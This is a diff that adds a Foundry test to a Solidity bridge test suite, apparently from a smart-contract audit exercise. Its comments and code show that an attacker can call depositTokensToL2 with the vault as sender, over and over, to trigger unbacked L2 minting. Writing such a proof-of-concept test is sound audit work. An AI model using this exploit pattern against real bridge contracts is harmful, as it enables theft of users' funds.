@@ -251,4 +251,36 @@ contract L1BossBridgeTest is Test {
         assertEq(token.balanceOf(user), 0);
         assertEq(token.balanceOf(address(vault)), depositAmount);
     }
+
+    function test_CanTransfer_FromVault_ToVault() public {
+        // 1. Vault will approve the bridge in contructor
+        // 2. Let's say vault has some balance
+        // 3. Bob maliciously call the `depositTokensToL2`
+        // using the params (from -> vault, l2Recipient -> bob, amount -> entire balance of `vault`)
+        // 4. After bob calls this function, `Deposit` event will be triggered.
+        // with following params (from -> vault, l2Recipient -> bob, amount -> entire balance of `vault` )
+        // Note: after an event in emitted, a centralized node will mint the tokens in L2 for `l2Recipient`
+        // 4. `l2Recipient` is bob, all the tokens will be minted for `bob`.
+        // 5. from L2 bob can withdraw the tokens.
+        // Attacker can do this Infinite times
+        // Attacker can mint infinite tokens in L2
+
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance);
+
+        // Can trigger the deposit event, self transfer tokens to the vault
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+        vm.stopPrank();
+
+        // Can do this forever
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+        vm.stopPrank();
+    }
 }
